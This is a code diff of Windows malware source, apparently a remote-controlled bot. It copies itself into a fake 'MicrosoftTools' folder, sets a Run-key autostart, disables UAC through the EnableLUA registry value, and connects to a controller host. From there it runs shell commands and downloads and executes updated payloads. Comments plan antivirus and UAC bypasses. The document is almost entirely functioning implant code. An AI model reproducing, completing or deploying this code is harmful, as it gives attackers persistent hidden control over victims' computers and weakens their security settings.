@@ -4,14 +4,9 @@
 #include "EA_Socket.h"
 #include "process.h"
 
-int port = 5005;//54977;
-char host[] = "127.0.0.1";//fbf-54977.portmap.io";
-char lastFolderName[60] = "MicrosoftTools";
-
-static void defect(void);
-static void lifeOnSystem(void);
 static void onlyRunCommand(char * cmd);
-static void readHostAndPortFromFile(void);
+static void infectTheSystemItself(void);
+static void connectToBigBrotherAndBecomeZombie(void);
 static int process(int sckt, char * al);
 
 int main()	// gcc --machine-windows
@@ -23,118 +18,116 @@ int main()	// gcc --machine-windows
 		Sleep(500);
 	}
 
-	//setlocale(LC_ALL, "Turkish");
-
+	//TODO: ByPass AV
 	//TODO: ByPass UAC
 
-	defect();
-
-	lifeOnSystem();
+	infectTheSystemItself();
+	connectToBigBrotherAndBecomeZombie();
 	
 	WSACleanup();
 
 	return 0;
 }
 
-static void defect(void)
+static void onlyRunCommand(char * cmd)
 {
-	// Get username
-	char username[UNLEN+1] = {0};
-	DWORD len = sizeof(username);
-	GetUserNameA(username, &len);
+	STARTUPINFO siStartInfo;
+	PROCESS_INFORMATION piProcInfo;
 
-	// Get path and program name
-	char * progName;
-	char srcPathwithName[MAX_PATH + 1] = {0};
+	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
+	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
+
+	siStartInfo.cb = sizeof(STARTUPINFO);
+
+	if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", cmd,
+			NULL, NULL, TRUE,
+			CREATE_NO_WINDOW, // CREATE_NO_WINDOW CREATE_NEW_CONSOLE
+			NULL, NULL, &siStartInfo, &piProcInfo))
+	{
+		CloseHandle(piProcInfo.hProcess);
+		CloseHandle(piProcInfo.hThread);
+	}
+
+	Sleep(500); //TODO: process tam açýlana kadar beklenmeli
+}
+
+static void infectTheSystemItself(void)
+{
+	HKEY hKey;
+	LONG lnRes;
+	DWORD dwAttr;
+	char command[400 + 1];
+	char targetPath[MAX_PATH + 1];
+	char srcPathwithName[MAX_PATH + 1];
+	char targetPathwithName[MAX_PATH + 1];
+	char lastFolderName[60] = "MicrosoftTools";
+	char progName[60] = "deneme.exe";
+
 	GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);
-	size_t i = strlen(srcPathwithName);
-	while(srcPathwithName[i - 1] != '\\') i--;
-	progName = srcPathwithName + i;
 
-	// Create target path
-	char targetPath[MAX_PATH + 1] = {0};
+	snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\%s", getenv("USERNAME"), lastFolderName);
 
-	strcpy(targetPath, "C:\\Users\\");
-	strcat(targetPath, username);
-	strcat(targetPath, "\\AppData\\Local\\");
-	strcat(targetPath, lastFolderName);
-
-	DWORD dwAttr = GetFileAttributesA(targetPath);
+	dwAttr = GetFileAttributesA(targetPath);
 
 	if (dwAttr != 0xffffffff && (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
 	{
-		int len = strlen(lastFolderName);
-
-		if (i < len || strncmp(srcPathwithName + i - 1 - len, lastFolderName, len) != 0)
+		if (strncmp(srcPathwithName, targetPath, strlen(targetPath)) != 0)
 		{
 			exit(0);
 		}
 		return;
 	}
 
-	char command[400] = {0};
-
-	strcpy(command, "/c mkdir ");
-	strcat(command, targetPath);
+	snprintf(command, 400, "/c mkdir %s", targetPath);
 	onlyRunCommand(command);
 
-	ZeroMemory(command, 400);
-	strcpy(command, "/c copy ");
-	strcat(command, srcPathwithName);
-	strcat(command, " ");
-	strcat(command, targetPath);
-	strcat(command, "\\");
-	strcat(command, progName);
+	snprintf(targetPathwithName, 400, "%s\\%s", targetPath, progName);
+
+	snprintf(command, 400, "/c copy %s %s", srcPathwithName, targetPathwithName);
 	onlyRunCommand(command);
 
-	ZeroMemory(command, 400);
-	strcpy(command, targetPath);
-	strcat(command, "\\");
-	strcat(command, progName);
-
-	HKEY hKey;
-	char * czStartName = progName;
-	char * czExePath   = command;
-
-	LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+	lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
 
 	if(ERROR_SUCCESS == lnRes)
 	{
-		lnRes = RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE * )czExePath, strlen(czExePath));
+		lnRes = RegSetValueExA(hKey, progName, 0, REG_SZ, (BYTE * )targetPathwithName, strlen(targetPathwithName));
 	}
 
 	RegCloseKey(hKey);
 
-	DWORD number = 0;
 	lnRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
 	// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
 	if(ERROR_SUCCESS == lnRes)
 	{
+		DWORD number = 0;
 		lnRes = RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE * )&number, sizeof(DWORD));
 	}
 
 	RegCloseKey(hKey);
 
-	ZeroMemory(command, 400);
-	strcpy(command, "/c start ");
-	strcat(command, targetPath);
-	strcat(command, "\\");
-	strcat(command, progName);
+	snprintf(command, 400, "/c start %s", targetPathwithName);
 	onlyRunCommand(command);
 
 	exit(0);
 }
 
-static void lifeOnSystem(void)
+static void connectToBigBrotherAndBecomeZombie(void)
 {
-	char * al;
 	int sckt;
+	char * al;
+    FILE * fIpPort;
+    int port = 5005;
     struct hostent * he;
 	int de, check = 0, yes = 1;
 	struct sockaddr_in veriler;
     struct in_addr ** addr_list;
+    char host[] = "127.0.0.1";
 
-    readHostAndPortFromFile();
+	if ((fIpPort = fopen("dt", "r")) != NULL)
+	{
+		fscanf(fIpPort,"%s %d", host, &port);
+		fclose(fIpPort);
+	}
 
 	while((he = gethostbyname(host)) == NULL)
 	{
@@ -188,49 +181,6 @@ static void lifeOnSystem(void)
 	}
 }
 
-static void onlyRunCommand(char * cmd)
-{
-	BOOL bSuccess = FALSE;
-	STARTUPINFO siStartInfo;
-	PROCESS_INFORMATION piProcInfo;
-
-	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
-	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
-
-	siStartInfo.cb = sizeof(STARTUPINFO);
-
-	bSuccess = CreateProcessA(TEXT("C:\\Windows\\System32\\cmd.exe"), cmd,
-		NULL, NULL, TRUE,
-		CREATE_NO_WINDOW, // CREATE_NO_WINDOW CREATE_NEW_CONSOLE
-		NULL, NULL, &siStartInfo, &piProcInfo
-	);
-
-	if (!bSuccess)
-	{
-		return;
-	}
-	else
-	{
-		CloseHandle(piProcInfo.hProcess);
-		CloseHandle(piProcInfo.hThread);
-	}
-
-	Sleep(500); //TODO: process tam açýlana kadar beklenmeli
-}
-
-static void readHostAndPortFromFile(void)
-{
-	FILE * fIpPort;
-
-	fIpPort = fopen("dt", "r");
-
-	if (fIpPort != NULL)
-	{
-		fscanf(fIpPort,"%s %d", host, &port);
-		fclose(fIpPort);
-	}
-}
-
 static int process(int sckt, char * al)
 {
 	if (strncmp(al, "cmd", 3) == 0)
@@ -245,13 +195,14 @@ static int process(int sckt, char * al)
 	{
 		processFileDownload(sckt, al + 9);
 	}
-	else if (strncmp(al, "update", 6) == 0)
+	else if (strncmp(al, "update ", 7) == 0)
 	{
-		// TODO: processUpdate(sckt);
-	}
-	else if (strncmp(al, "hostsil ", 8) == 0)
-	{
-		// TODO: remove public ip from exe
+		char command[400 + 1];
+		onlyRunCommand("/c rename *.exe old.exe");
+		processFileDownload(sckt, al + 7);
+		snprintf(command, 400, "/c start %s", al + 7);
+		onlyRunCommand(command);
+		exit(0);
 	}
 	else if (strncmp(al, "host port ", 10) == 0)
 	{
